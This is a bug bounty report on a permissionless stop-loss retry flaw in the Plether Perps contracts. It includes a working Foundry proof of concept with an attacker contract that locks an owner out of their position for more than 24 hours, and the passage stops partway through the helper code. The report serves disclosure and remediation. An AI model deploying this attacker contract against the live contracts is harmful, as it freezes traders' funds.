# \#97701 [SC-High] permissionless `retryPositionProtectionClose()` re-queues a rejected stop-loss close before its owner can amend it, freezing the position and its margin for more than 24 hours

**Submitted on Nov 2nd 2026 at 18:38:04 UTC by @emanueldlvg for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97701
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 1 hour
  - Temporary freezing of funds for at least 24 hours

## Description

## Affected contracts (in-scope commit `a82d4fef`; identical runtime code live on Arbitrum Sepolia v2.0.0)

The defect is in `packages/perps/src` at the code-freeze commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. Release v2.0.0 (source `1209ca8a`) has no `packages/perps/src` difference from that commit and is live on Arbitrum Sepolia. The runtime bytecode of every contract below matches a build of the in-scope commit, apart from immutable references and the metadata hash. The live Router reports `maxExecutionWindowSeconds = 60` and `positionProtectionTriggerBountyAssets = 200000`. The proof of concept uses the same values. Plether Perps will be deployed on Arbitrum One from this code.

| Contract | Source | Arbitrum Sepolia v2.0.0 address | Role in the issue |
|---|---|---|---|
| `PositionProtectionBook` | `packages/perps/src/PositionProtectionBook.sol` | `0x81E3b03Cf29865b6c0f85925839567e2Bc61073D` | Permissionless retry, owner-only amend, cancel, relatch |
| `OrderRouter` | `packages/perps/src/OrderRouter.sol` | `0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444` | Public `executeOrder`, `expireOrder` and `commitOrder`; relatch callback |
| `OrderRouterLiquidationBatchSidecar` | `packages/perps/src/router/OrderLiquidationBatchLogic.sol` | `0x7b605d7c57c191379822705d8510109d4b2573aa` | `commitProtectionCloseAttempt`, protection lock on public commits |
| `OrderRecoverySidecar` | `packages/perps/src/OrderRecoverySidecar.sol` | `0x2df705806c0013e75e36fad4d6595c998f4295be` | Permissionless, oracle-free expiry |
| `OrderRouterExecutionSidecar` | `packages/perps/src/OrderRouterExecutionSidecar.sol` | `0x0ae016ef599bcdf0bbbedba441401c3b6c6184ea` | Executes, and terminally rejects, the bounded close attempt |

The affected configuration is the release configuration. It has a 60-second execution window, a 0.04% execution fee, 0.1% maintenance margin, 0.2% initial margin and a 0.20 USDG trigger bounty, and close attempts pay no execution bounty. A protection carries trader-chosen close ceilings for execution notional, gross account debit, action charge and explicit fees.

## Brief/Intro

A triggered stop-loss or take-profit close can be rejected by the owner's own retained close ceilings. The protection then becomes `Latched`. The documented remedy is `amendLatchedPositionProtectionCloseLimits()`, the owner's only way to repair the ceiling and exit. It works only while the protection is `Latched` and the account has no pending Router order.

`retryPositionProtectionClose()` has no caller check. It queues a fresh attempt with the same rejected ceilings, which moves the protection back to `Triggered` and creates a pending order. Ending an attempt is also permissionless: `expireOrder()` after the 60-second window, or `executeOrder()` with a tick the ceiling rejects. Anyone can therefore end each rejected attempt and queue the next one inside one transaction. The owner never sees a state in which an amendment is accepted. Cancelling, cancelling and closing, and ordinary close orders are all rejected while a protection is triggered or latched.

The proof of concept opens a 100,000 USDG LONG with 5,000 USDG margin and a stop-loss whose ceilings allow the expected stop-price close. The first tick after the stop gaps to +1.00%, and the ceiling rejects that close. In the control branch the owner amends and exits 4 seconds after the trigger. In the attack branch an unprivileged contract sends one transaction per 60-second window. After 1,418 transactions and 86,439 seconds, every owner exit path still reverts, 4,810.099787 USDG of position margin is still locked, and the 101,000 USDG position is still open. The attacker needs no deposit, position, approval or role. Its only cost is about 0.94 million gas per transaction.

## Vulnerability Details

### The owner's only repair path needs `Latched` and an empty queue

The MED-9 fix stores trader-selected close ceilings and copies them into every protection close attempt. Only the owner may change them, and only while the protection is latched with no live order:

`PositionProtectionBook.sol`, lines 315–328:

```solidity
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

The published MED-9 resolution names this as the recovery: "Tight limits may prevent execution until conditions improve or the owner amends them." `CANONICAL_ENTRYPOINTS.md` documents the same rule: the owner may amend the close ceilings of a `Latched` protection "when the account has no pending Router order".

### Retry has no caller check and re-queues the rejected ceilings

`retryPositionProtectionClose` loads the protection with `_activeProtection`, which checks only that it exists and is active. The owner-checking helper, `_ownedActiveProtection`, is used by amend, replace and cancel but not by retry:

`PositionProtectionBook.sol`, lines 382–406:

```solidity
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    _requireMatchingPosition(protection);

    IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
    if (router.pendingOrderCounts(protection.account) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    ...
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
        .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    ...
    _recordCloseAttempt(protection, linkedOrderId);
}
```

The Router builds the retry from the retained ceilings that just rejected the close:

`router/OrderLiquidationBatchLogic.sol`, lines 657–679:

```solidity
PositionProtectionTypes.CloseFinancialLimits memory limits =
    host.positionProtectionBook().closeFinancialLimits(protectionId);
...
request.bounds.executionWindowSeconds = uint32(host.maxExecutionWindowSeconds());
...
request.bounds.maxExecutionNotionalAssets = limits.maxExecutionNotionalAssets;
request.bounds.maxGrossAccountDebitAssets = limits.maxGrossAccountDebitAssets;
request.bounds.maxActionChargeAssets = limits.maxActionChargeAssets;
request.bounds.maxExplicitFeesAssets = limits.maxExplicitFeesAssets;
```

`_recordCloseAttempt` (lines 564–578) then sets `protection.status = Triggered`, and the account has one pending order. Both conditions of the amend function now fail.

### Ending a rejected attempt is permissionless and relatches it

Expiry checks only the deadline:

`OrderRecoverySidecar.sol`, lines 49–63:

```solidity
function expireOrder(
    uint64 orderId
) external delegated returns (OrderV3Types.ExecutionResult memory) {
    ...
    if (block.timestamp <= pending.timing.executionDeadline) {
        revert OrderRouter__OrderNotExpired();
    }
    ...
    return host.executeOrderItemFromSidecar(request);
}
```

A terminal failure of a protection attempt, whether expiry or a ceiling violation at execution, reaches the Book through the Router:

`OrderRouter.sol`, lines 324–329:

```solidity
if (!success && lifecycleBook.isProtectionAttempt(order.orderId)) {
    ...
    positionProtectionBook.handleFailedProtectionAttempt(order.orderId, order.account, reason);
}
```

`PositionProtectionBook.sol`, lines 662–668:

```solidity
delete _attemptProtectionIds[orderId];
retained = _positionMatches(protection);
emit PositionProtectionCloseAttemptFailed(protectionId, account, orderId, reason, retained);
if (retained) {
    protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
    return true;
}
```

The protection is `Latched` with an empty queue only between this callback and the next retry. A contract that calls `expireOrder` (or `executeOrder`) and then `retryPositionProtectionClose` in the same transaction removes that window entirely.

### Every other owner exit is closed while the protection is triggered

- `cancelPositionProtection` → `_cancel` accepts only `PendingOpen` and `Armed` (`PositionProtectionBook.sol`, lines 413–419) and reverts `OrderRouter__ProtectionNotArmed`.
- `cancelPositionProtectionAndCommitClose` accepts only `Armed` (lines 345–348).
- An ordinary close through `OrderRouter.commitOrder` is rejected for any account with an active protection:

`router/OrderLiquidationBatchLogic.sol`, lines 313–315:

```solidity
if (enforceProtectionLock && host.positionProtectionBook().activePositionProtectionId(account) != 0) {
    revert OrderRouter__ProtectionActive();
}
```

`SECURITY.md` states that "Triggering is irreversible". After a trigger, the owner's only ways out are therefore a protection attempt that executes, or the latched amendment.

### The broken invariant

After the owner's ceiling rejects a protection close, the owner must be able to amend that ceiling before another attempt with the same ceiling is queued. The code relies on keepers behaving well instead of enforcing this. `DEPLOYMENT.md` asks keeper operators to "Investigate planner, constraint, or other persistent failures before retrying; do not continuously queue the same failing attempt." Nothing on-chain stops a caller from doing exactly that.

### Relation to published findings

MED-9 ("Keepers can retry protection closes without the trader's financial limits") was resolved by adding the retained ceilings and the owner-only latched amendment. This report shows that the fix introduces a new defect. The ceilings it added can reject a close, the amendment it added is the only way past that rejection, and the permissionless retry it kept can deny the amendment indefinitely. The published protection-liveness items (MED-8, MED-15, MED-17, MED-23, MED-28, MED-30, LOW-50) and the `SECURITY.md` limitations concern triggers or retries that do not happen. This issue is the opposite: retries that cannot be stopped and that lock out the owner.

## Exploitation

The test uses the repository's Foundry suite at the in-scope commit. Pyth updates come from the suite's `MockPyth`, and USDG from the suite's mock settlement token. No in-scope contract is modified. The Router, Oracle and risk parameters are set to the release values listed in `DEPLOYMENT.md` and read from the live v2.0.0 deployment.

1. The owner deposits 20,000 USDG. Through the public V3 `commitOrder` and keeper execution, the owner opens a LONG of `100,000e18` size (100,000 USDG notional at 1.00) with 5,000 USDG margin.
2. The owner creates a stop-loss at 1.005 (+0.50%) with close ceilings of 110,000 USDG notional, 750 USDG gross account debit, 1,000 USDG action charge and 100 USDG explicit fees. A reference branch shows that a close at the stop price debits 490.299843 USDG and executes within these ceilings.
3. The first tick at or above the stop prints at 1.01 (+1.00%). A keeper triggers the protection and its first close attempt is queued.
4. Control branch: a keeper executes the attempt. The close would debit 990.499872 USDG, so it fails with `ConstraintViolation(GrossAccountDebit)` and the protection relatches. The owner raises the gross-debit ceiling to 1,500 USDG, a keeper retries, and the position closes 4 seconds after the trigger.
5. Attack branch, cycle 1: from the same state, the attacker contract executes the attempt itself. It fails with the same `GrossAccountDebit` violation, and the contract calls `retryPositionProtectionClose` in the same transaction. The protection is `Triggered` again with a new attempt that carries the 750 USDG ceiling.
6. Every 61 seconds the attacker contract calls `expireOrder(attempt)` and then `retryPositionProtectionClose(protectionId)` in one transaction. These calls need no oracle data. After each transaction the test calls every owner exit path, and each one reverts:
   - `amendLatchedPositionProtectionCloseLimits` with `OrderRouter__ProtectionNotLatched`;
   - `cancelPositionProtection` with `OrderRouter__ProtectionNotArmed`;
   - `cancelPositionProtectionAndCommitClose` with `OrderRouter__ProtectionNotArmed`;
   - `commitOrder` for a full close with `OrderRouter__ProtectionActive`.
7. After 1,418 attacker transactions, 86,439 seconds after the trigger, the position is unchanged. The owner can withdraw 14,999.600000 USDG of free settlement, and a withdrawal of one atom more reverts. The 4,810.099787 USDG position margin stays locked.
8. The attacker stops. A keeper expires the last attempt, the protection relatches, and the owner can now amend, retry and close at the same price. The exit comes 86,502 seconds after the trigger, against 4 seconds in the control branch.

A second test runs the same sequence for one hour (60 attacker transactions, 3,601 seconds) with default forge settings.

## Impact Details

Any unprivileged account can stop a protected trader from closing, reducing or changing a position after its stop-loss or take-profit has fired, for as long as it keeps sending one transaction per 60-second execution window. The trader's position margin and the position's profit and loss stay locked for that time. The proof of concept holds 4,810.099787 USDG of margin on a 101,000 USDG position for more than 24 hours. This is **temporary freezing of funds for at least 24 hours**, the program's High impact. The default-settings one-hour test also meets the Medium impact, "temporary freezing of funds for at least 1 hour".

The attack costs only gas. The attacker contract holds no ETH and no USDG, opens no position and needs no role. It used 936,528 gas per transaction and 1,327,998,103 gas for the 1,418 transactions. At Arbitrum One's 0.01 gwei minimum base fee that is about 0.0133 ETH of execution gas for 24 hours. The attacker does not depend on other keepers. In its first cycle it executes the rejected attempt itself, and in later cycles it uses oracle-free expiry. Either way, a `Latched` protection with an empty queue never exists between transactions. Protection close attempts pay no execution bounty, so ending them is unpaid work that the attacker simply does itself.

The vulnerable state arises in normal use. A trader sets ceilings with margin above the expected stop-price close, exactly as the MED-9 fix intends, and the market gaps through the stop. Gaps are routine for this product: for example, protections do not trigger while the FX market is frozen, so the first live tick after a weekend can land well beyond a stop. While the owner is locked out, the position stays exposed after its stop has already fired. The lock ends only when the attacker stops, when an attempt happens to execute inside the old ceiling, or when the position is liquidated.

## Recommendation

Give the owner a repair window that a third party cannot consume. Options, in order of preference:

1. Record why the last attempt failed. When it failed one of the trader-set financial ceilings (`ConstraintViolation` on execution notional, gross account debit, action charge or explicit fees), allow only the owner to retry, since only the owner can change that outcome. Expiry and dependency failures can stay permissionlessly retryable if keeper liveness requires it.
2. After any relatch, give the owner a grace period, for example one execution window, before a non-owner may retry. Store the relatch time on the protection.
3. Add an owner-only amend-and-retry action that is accepted while the protection is `Triggered`. It would atomically terminate the live zero-bounty attempt and queue a new one with the amended ceilings, so the owner never needs the `Latched` and empty-queue state.

Add a regression test that ends a ceiling-rejected attempt and retries it from a third-party account in one transaction. Then assert that the owner can still amend in the next transaction.

## Proof of Concept

Save the test below as `packages/perps/test/perps/poc/ProtectionRetryLockout.t.sol` and run it from the repository root:

```bash
# One-hour lockout, default forge settings
forge test --root packages/perps --match-path test/perps/poc/ProtectionRetryLockout.t.sol \
  --match-test OverOneHour -vv

# 24-hour lockout: 1,418 attacker transactions exceed forge's default 2^30 per-test gas limit
forge test --root packages/perps --match-path test/perps/poc/ProtectionRetryLockout.t.sol \
  --match-test Over24Hours --gas-limit 9223372036854775807 -vv
```

The test inherits the suite's `BasePerpTest`. Its Router harness only adds a legacy scalar `commitOrder` overload, and the PoC uses the production V3 `commitOrder(OrderRequest)`, `executeOrder`, `expireOrder` and Book entrypoints.

### Complete test:

<details>
<summary>Complete test </summary>

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {ICfdOrderPolicyEvaluator} from "@plether/perps/interfaces/ICfdOrderPolicyEvaluator.sol";
import {IOrderLifecycleBook} from "@plether/perps/interfaces/IOrderLifecycleBook.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @notice Public Router entrypoints used by the attacker. No role, approval, deposit or position is required.
interface IPublicRouter {

    function expireOrder(
        uint64 orderId
    ) external returns (OrderV3Types.ExecutionResult memory);

    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable returns (OrderV3Types.ExecutionResult memory);

}

/// @notice Unprivileged attacker contract. Each call ends one failed protection attempt and immediately queues the
///         next one inside the same transaction, so the owner never observes `Latched` with an empty queue.
contract ProtectionRetryLocker {

    IPublicRouter internal immutable router;
    IPositionProtectionActions internal immutable book;

    constructor(
        address router_,
        address book_
    ) {
        router = IPublicRouter(router_);
        book = IPositionProtectionActions(book_);
    }

    /// @dev Executes the live close attempt (it fails the owner's retained ceiling), then re-queues it.
    function relockByExecution(
        uint64 attemptOrderId,
        uint64 protectionId,
        bytes[] calldata pythUpdateData
    ) external payable returns (uint64 nextAttemptOrderId) {
        OrderV3Types.ExecutionResult memory result = router.executeOrder{value: msg.value}(attemptOrderId, pythUpdateData);
        require(result.terminalReason == OrderV3Types.TerminalReason.ConstraintViolation, "attempt did not fail");
        nextAttemptOrderId = book.retryPositionProtectionClose(protectionId);
    }

    /// @dev Expires the live close attempt once its 60-second window has passed, then re-queues it.
    function relockByExpiry(
        uint64 attemptOrderId,
        uint64 protectionId
    ) external returns (uint64 nextAttemptOrderId) {
        OrderV3Types.ExecutionResult memory result = router.expireOrder(attemptOrderId);
        require(result.terminalReason == OrderV3Types.TerminalReason.Expired, "attempt did not expire");
        nextAttemptOrderId = book.retryPositionProtectionClose(protectionId);
    }

}

/// @notice An unprivileged caller keeps a triggered stop-loss in an unfixable state: every time the owner's retained
///         close ceiling rejects the close, the caller re-queues the same rejected close before the owner can amend
///         the ceiling. The owner cannot amend, cancel, or close the position until the caller stops.
contract ProtectionRetryLockoutPoC is BasePerpTest {

    address internal constant OWNER = address(0xA11CE);
    address internal constant ATTACKER_EOA = address(0xBADBAD);
    address internal constant TRIGGER_KEEPER = address(0x7106);
    address internal constant HONEST_KEEPER = address(0xE0EC);

    uint256 internal constant ENTRY_PRICE = 1e8;
    uint256 internal constant STOP_LOSS_PRICE = 100_500_000; // LONG stop-loss fires at or above +0.50%
    uint256 internal constant GAP_PRICE = 101_000_000; // the first published tick after the stop: +1.00%
    uint256 internal constant POSITION_SIZE = 100_000e18; // 100,000 USDG notional at 1.00
    uint256 internal constant POSITION_MARGIN = 5000e6;
    uint256 internal constant OWNER_DEPOSIT = 20_000e6;

    // The owner's retained stop-loss ceilings: expected stop loss of about 500 USDG plus fees, with slack.
    uint256 internal constant MAX_EXECUTION_NOTIONAL = 110_000e6;
    uint256 internal constant MAX_GROSS_ACCOUNT_DEBIT = 750e6;
    uint256 internal constant MAX_ACTION_CHARGE = 1000e6;
    uint256 internal constant MAX_EXPLICIT_FEES = 100e6;

    IPositionProtectionActions internal book;
    IPositionProtectionViews internal bookViews;
    ProtectionRetryLocker internal locker;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        // packages/perps/DEPLOYMENT.md "Initial release parameters" and the live v2.0.0 manifest.
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function setUp() public override {
        super.setUp();
        _applyReleaseRouterConfig();

        book = IPositionProtectionActions(address(router.positionProtectionBook()));
        bookViews = IPositionProtectionViews(address(router.positionProtectionBook()));
        vm.prank(ATTACKER_EOA);
        locker = new ProtectionRetryLocker(address(router), address(book));

        _fundTrader(OWNER, OWNER_DEPOSIT);
        _refreshMark(ENTRY_PRICE);
    }

    /// @notice Runs with default forge settings: 60 attacker transactions keep the owner out for over one hour.
    function test_PermissionlessRetryLocksOwnerOutOfTriggeredStopLossForOverOneHour() external {
        _runLockout(1 hours);
    }

    /// @notice 1,418 attacker transactions keep the owner out for over 24 hours. Their gas exceeds forge's default
    ///         2^30 per-test limit, so run this test with `--gas-limit 9223372036854775807`.
    function test_PermissionlessRetryLocksOwnerOutOfTriggeredStopLossForOver24Hours() external {
        _runLockout(24 hours);
    }

    function _runLockout(
        uint256 minimumLockout
    ) internal {
        _startRecordingLogs();
        uint64 protectionId = _openAndProtect();

        // Reference: had the first tick after the stop printed at the stop price, the owner's ceilings would pass.
        uint256 stopCloseDebit;
        {
            uint256 referenceSnapshot = vm.snapshotState();
            uint64 attemptAtStop = _trigger(protectionId, STOP_LOSS_PRICE);
            uint256 balanceBefore = clearinghouse.balanceAssets(OWNER);
            OrderV3Types.ExecutionResult memory closedAtStop = _executeAt(HONEST_KEEPER, attemptAtStop, STOP_LOSS_PRICE);
            assertEq(uint8(closedAtStop.status), uint8(OrderV3Types.LifecycleStatus.Executed), "stop close failed");
            stopCloseDebit = balanceBefore - clearinghouse.balanceAssets(OWNER);
            assertLt(stopCloseDebit, MAX_GROSS_ACCOUNT_DEBIT, "ceilings were not sufficient at the stop price");
            assertTrue(vm.revertToState(referenceSnapshot), "snapshot restore failed");
        }

        // The market gaps through the stop: the first published tick is +1.00%.
        uint64 firstAttempt = _trigger(protectionId, GAP_PRICE);
        uint256 triggerTime = vm.getBlockTimestamp();
        uint256 balanceAtTrigger = clearinghouse.balanceAssets(OWNER);
        uint256 branch = vm.snapshotState();

        // Control: the documented recovery. The rejected attempt relatches, the owner raises the gross-debit
        // ceiling, and a retry closes the position at the same +1.00% price.
        uint256 controlExitDelay;
        uint256 gapCloseDebit;
        uint256 controlBalanceAfterExit;
        {
            OrderV3Types.ExecutionResult memory failed = _executeAt(HONEST_KEEPER, firstAttempt, GAP_PRICE);
            _assertConstraintFailure(failed, firstAttempt);
            _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched);
            vm.prank(OWNER);
            book.amendLatchedPositionProtectionCloseLimits(protectionId, _raisedLimits());
            vm.prank(HONEST_KEEPER);
            uint64 retry = book.retryPositionProtectionClose(protectionId);
            OrderV3Types.ExecutionResult memory closed = _executeAt(HONEST_KEEPER, retry, GAP_PRICE);
            assertEq(uint8(closed.status), uint8(OrderV3Types.LifecycleStatus.Executed), "control close failed");
            assertEq(_positionSize(OWNER), 0, "control position still open");
            controlExitDelay = vm.getBlockTimestamp() - triggerTime;
            controlBalanceAfterExit = clearinghouse.balanceAssets(OWNER);
            gapCloseDebit = balanceAtTrigger - controlBalanceAfterExit;
            assertGt(gapCloseDebit, MAX_GROSS_ACCOUNT_DEBIT, "gap close did not exceed the ceiling");
        }
        assertTrue(vm.revertToState(branch), "snapshot restore failed");

        // Attack, cycle 1: the attacker executes the rejected attempt itself and re-queues it in the same transaction.
        uint256 cycles;
        uint256 gasUsed;
        uint64 attempt;
        {
            bytes[] memory tick = _historicalTick(firstAttempt, GAP_PRICE);
            uint256 gasBefore = gasleft();
            vm.prank(ATTACKER_EOA);
            attempt = locker.relockByExecution(firstAttempt, protectionId, tick);
            gasUsed += gasBefore - gasleft();
            ++cycles;
        }
        _assertConstraintFailure(_lastResult(firstAttempt), firstAttempt);
        _assertOwnerLockedOut(protectionId, attempt);

        // Later cycles: one oracle-free transaction per 60-second execution window until the target is reached.
        while (vm.getBlockTimestamp() - triggerTime < minimumLockout) {
            uint64 deadline = router.lifecycleBook().orderTiming(attempt).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);
            uint256 gasBefore = gasleft();
            vm.prank(ATTACKER_EOA);
            attempt = locker.relockByExpiry(attempt, protectionId);
            gasUsed += gasBefore - gasleft();
            ++cycles;
            _assertOwnerLockedOut(protectionId, attempt);
        }
        uint256 lockout = vm.getBlockTimestamp() - triggerTime;
        assertGe(lockout, minimumLockout, "lockout shorter than the target");
        assertEq(_positionSize(OWNER), POSITION_SIZE, "position changed during the lockout");

        // The position margin cannot leave the account while the position is held open.
        uint256 balanceDuringLockout = clearinghouse.balanceAssets(OWNER);
        uint256 freeDuringLockout = _freeSettlementAssets(OWNER);
        (, uint256 marginDuringLockout,,,,,) = engine.positions(OWNER);
        assertLe(freeDuringLockout + marginDuringLockout, balanceDuringLockout, "margin counted as free");
        vm.prank(OWNER);
        vm.expectRevert();
        clearinghouse.withdraw(OWNER, freeDuringLockout + 1);

        // The attacker stops. Only then can the owner use the same recovery as in the control branch.
        {
            uint64 deadline = router.lifecycleBook().orderTiming(attempt).executionDeadline;
            vm.warp(uint256(deadline) + 1);
            vm.roll(vm.getBlockNumber() + 1);
            vm.prank(HONEST_KEEPER);
            router.expireOrder(attempt);
            _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Latched);
            vm.prank(OWNER);
            book.amendLatchedPositionProtectionCloseLimits(protectionId, _raisedLimits());
            vm.prank(HONEST_KEEPER);
            uint64 retry = book.retryPositionProtectionClose(protectionId);
            OrderV3Types.ExecutionResult memory closed = _executeAt(HONEST_KEEPER, retry, GAP_PRICE);
            assertEq(uint8(closed.status), uint8(OrderV3Types.LifecycleStatus.Executed), "late close failed");
            assertEq(_positionSize(OWNER), 0, "late close left the position open");
        }
        uint256 attackExitDelay = vm.getBlockTimestamp() - triggerTime;

        assertEq(clearinghouse.balanceAssets(ATTACKER_EOA), 0, "attacker needed no protocol balance");
        assertEq(address(locker).balance, 0, "attacker contract holds no ETH");

        emit log_named_decimal_uint("close debit at the +0.50% stop (USDG)", stopCloseDebit, 6);
        emit log_named_decimal_uint("retained gross-debit ceiling (USDG)", MAX_GROSS_ACCOUNT_DEBIT, 6);
        emit log_named_decimal_uint("close debit at the +1.00% gap (USDG)", gapCloseDebit, 6);
        emit log_named_uint("owner exit delay, control (seconds after trigger)", controlExitDelay);
        emit log_named_uint("attacker transactions", cycles);
        emit log_named_uint("owner lockout while the attacker cycles (seconds)", lockout);
        emit log_named_uint("owner exit delay, attack (seconds after trigger)", attackExitDelay);
        emit log_named_uint("attacker gas, all transactions", gasUsed);
        emit log_named_uint("attacker gas per transaction", gasUsed / cycles);
        emit log_named_decimal_uint("position notional held open (USDG)", POSITION_SIZE * GAP_PRICE / 1e20, 6);
        emit log_named_decimal_uint("owner balance during the lockout (USDG)", balanceDuringLockout, 6);
        emit log_named_decimal_uint("owner withdrawable during the lockout (USDG)", freeDuringLockout, 6);
        emit log_named_decimal_uint("position margin held during the lockout (USDG)", marginDuringLockout, 6);
        emit log_named_decimal_uint("owner balance after exit, control (USDG)", controlBalanceAfterExit, 6);
        emit log_named_decimal_uint("owner balance after exit, attack (USDG)", clearinghouse.balanceAssets(OWNER), 6);
    }

    // --- Scenario steps ---

    function _openAndProtect() internal returns (uint64 protectionId) {
        // 1. The owner opens a 100,000 USDG LONG with 5,000 USDG margin through the public V3 path.
        OrderV3Types.OrderRequest memory open = _openRequest();
        vm.prank(OWNER);
        uint64 openOrderId = router.commitOrder(open);
        OrderV3Types.ExecutionResult memory opened = _executeAt(HONEST_KEEPER, openOrderId, ENTRY_PRICE);
        assertEq(uint8(opened.status), uint8(OrderV3Types.LifecycleStatus.Executed), "open failed");
        assertEq(_positionSize(OWNER), POSITION_SIZE, "position not opened");
        _refreshMark(ENTRY_PRICE);

        // 2. The owner attaches a stop-loss at +0.50% with explicit close ceilings (the MED-9 fix).
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.stopLossTriggerPrice = STOP_LOSS_PRICE;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: MAX_EXECUTION_NOTIONAL,
            maxGrossAccountDebitAssets: MAX_GROSS_ACCOUNT_DEBIT,
            maxActionChargeAssets: MAX_ACTION_CHARGE,
            maxExplicitFeesAssets: MAX_EXPLICIT_FEES
        });
        vm.prank(OWNER);
        protectionId = book.createPositionProtection(params);
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Armed);
    }

    function _trigger(
        uint64 protectionId,
        uint256 price
    ) internal returns (uint64 attempt) {
        // 3. Any keeper triggers the stop at the first tick at or above it.
        _nextBlock();
        vm.prank(TRIGGER_KEEPER);
        attempt = book.triggerPositionProtection(protectionId, _liveTick(price));
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Triggered);
        assertEq(router.pendingOrderCounts(OWNER), 1, "trigger did not queue a close");
    }

    function _lastResult(
        uint64 orderId
    ) internal view returns (OrderV3Types.ExecutionResult memory result) {
        OrderV3Types.TerminalOutcome memory outcome = router.lifecycleBook().terminalOutcome(orderId);
        result.status = outcome.status;
        result.terminalReason = outcome.reason;
    }

    function _assertOwnerLockedOut(
        uint64 protectionId,
        uint64 attempt
    ) internal {
        // The attacker's transaction always ends with a fresh live attempt and the old rejected ceilings.
        _assertStatus(protectionId, PositionProtectionTypes.PositionProtectionStatus.Triggered);
        assertEq(bookViews.getPositionProtection(protectionId).linkedOrderId, attempt, "attempt not linked");
        assertEq(router.pendingOrderCounts(OWNER), 1, "no live attempt");
        assertEq(
            router.lifecycleBook().pendingPolicy(attempt).maxGrossAccountDebitAssets,
            MAX_GROSS_ACCOUNT_DEBIT,
            "attempt does not reuse the rejected ceiling"
        );

        // Every owner exit path reverts.
        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        book.amendLatchedPositionProtectionCloseLimits(protectionId, _raisedLimits());

        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.cancelPositionProtection(protectionId);

        OrderV3Types.OrderRequest memory close = _closeRequest();
        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.cancelPositionProtectionAndCommitClose(protectionId, close);

        vm.prank(OWNER);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(close);

        assertEq(_positionSize(OWNER), POSITION_SIZE, "position closed");
    }

    // --- Helpers ---

    function _applyReleaseRouterConfig() internal {
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        // Live Arbitrum Sepolia v2.0.0 Router and Oracle values (identical source to the code freeze).
        config.maxExecutionWindowSeconds = 60;
        config.orderExecutionStalenessLimit = 60;
        config.liquidationStalenessLimit = 15;
        config.basketMaxConfidenceRatioBps = 10;
        config.orderSettlementWindow = 15;
        config.maxComponentPublishTimeDivergence = 5;
        config.adverseConfidenceMultiplierBps = 2500;
        config.minOpenNotionalAssets = 1000e6;
        config.openOrderExecutionBountyBps = 1;
        config.minOpenOrderExecutionBountyAssets = 10_000;
        config.maxOpenOrderExecutionBountyAssets = 200_000;
        config.positionProtectionTriggerBountyAssets = 200_000;
        config.maxPendingOrders = 5;
        config.minEngineGas = 600_000;
        config.maxPruneOrdersPerCall = 64;
        _setRouterConfig(config);
        assertEq(engine.executionFeeBps(), 4, "execution fee");
    }

    function _openRequest() internal view returns (OrderV3Types.OrderRequest memory request) {
        request.clientOrderId = keccak256("owner-open");
        request.side = CfdTypes.Side.LONG;
        request.sizeDelta = POSITION_SIZE;
        request.marginDelta = POSITION_MARGIN;
        request.targetPrice = 1;
        request.isClose = false;
        request.bounds = _bounds();
    }

